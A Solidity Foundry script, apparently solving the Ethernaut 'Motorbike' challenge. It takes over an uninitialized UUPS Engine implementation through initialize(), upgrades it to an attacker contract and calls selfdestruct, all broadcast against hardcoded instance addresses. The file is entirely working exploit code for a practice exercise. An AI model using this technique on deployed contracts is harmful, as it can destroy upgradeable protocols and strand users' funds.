// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {Motorbike, Engine} from "../src/MotorBike.sol";

contract hack {
    function pwn(Engine target) public {
        target.initialize();
        target.upgradeToAndCall(address(this), abi.encodeWithSelector((this).kill.selector));
    }
    
    function kill() external {
     selfdestruct(payable(address(0)));
    }
}

contract MotorBikeScript is Script {
    Motorbike public bike = Motorbike(payable(0xF07Ab9D0B89739565F4b6d6Ba6D55248fB0b12A9));
    Engine public engine = Engine(0xDC51Af70A793Cbf252Bf072937cF3521107583ec);
    function run() public {
        vm.startBroadcast();
        hack h = new hack();
        h.pwn(engine);
        vm.stopBroadcast();
    }
}
